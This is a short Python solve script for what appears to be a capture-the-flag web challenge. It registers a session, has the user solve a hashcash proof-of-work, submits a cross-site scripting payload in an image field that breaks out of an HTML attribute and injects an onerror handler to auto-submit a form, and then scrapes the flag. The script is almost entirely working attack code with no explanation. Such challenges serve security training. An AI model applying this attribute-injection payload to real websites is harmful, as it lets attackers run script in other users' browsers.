#!/usr/bin/env python3
import requests, re, time

URL = "https://cinghiali.challs.olicyber.it/"
REGEX = r'hashcash -mCb26 ".*"'
FLAG = r'flag{.*}'
EXPLOIT = "fsaf\" onerror=\"document.getElementsByTagName('form')[0].submit()"

s = requests.Session()
s.post(URL + 'register')

r = s.get(URL + 'create')
hashcash = re.findall(REGEX, r.text)[0]
print(hashcash)
hashcash = input(f"Resolve >> ")

s.post(URL + 'create', data={
    'address': 'prova lol',
    'image': EXPLOIT,
    'pow': hashcash
})

time.sleep(7)
print(re.findall(FLAG, s.get(URL).text)[0])
